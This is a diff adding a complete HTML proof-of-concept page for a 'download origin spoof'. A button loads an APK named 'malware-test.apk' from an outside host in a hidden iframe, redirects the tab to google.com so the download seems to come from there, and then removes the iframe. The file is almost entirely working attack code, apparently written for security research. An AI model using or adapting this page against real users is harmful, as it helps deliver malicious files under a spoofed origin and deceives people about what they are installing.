@@ -1,0 +1,66 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Download origin spoof PoC</title>
+  <style>
+    .button {
+      background-color: #4CAF50;
+      border: none;
+      color: white;
+      padding: 12px 24px;
+      text-align: center;
+      text-decoration: none;
+      display: inline-block;
+      font-size: 16px;
+      margin: 12px;
+      cursor: pointer;
+      border-radius: 6px;
+    }
+    .note { font-size: 13px; color: #444; margin-top: 8px; }
+  </style>
+</head>
+<body>
+  <main style="text-align:center; padding: 40px;">
+    <h2>Download origin spoof PoC</h2>
+    <button id="start" class="button" type="button">Open</button>
+    <div class="note">Click the button to start download, then the page will redirect to google.com.</div>
+  </main>
+
+  <script>
+  (function () {
+    const DOWNLOAD_URL = 'https://rebelsec.id/malware-test.apk'; // change to benign test file for public PoC
+    const DELAY_MS = 1000; // wait before redirect to allow download to start
+    const CLEANUP_MS = 15_000; // remove iframe after this many ms
+
+    const btn = document.getElementById('start');
+    let inProgress = false;
+
+    btn.addEventListener('click', () => {
+      if (inProgress) return; // prevent double-clicks
+      inProgress = true;
+      btn.disabled = true;
+      btn.textContent = 'Starting...';
+
+      // 1) create a hidden iframe to start the download (browser handles it)
+      const iframe = document.createElement('iframe');
+      iframe.style.display = 'none';
+      iframe.src = DOWNLOAD_URL;
+      document.body.appendChild(iframe);
+
+      // 2) after a short delay, navigate this tab to a benign site
+      setTimeout(() => {
+        try { window.location.replace('https://google.com'); }
+        catch (e) { /* ignore navigation errors */ }
+      }, DELAY_MS);
+
+      // 3) cleanup: remove iframe from DOM after some time
+      setTimeout(() => {
+        try { document.body.removeChild(iframe); } catch (e) { /* ignore */ }
+      }, CLEANUP_MS);
+    }, { passive: true });
+  })();
+  </script>
+</body>
+</html>
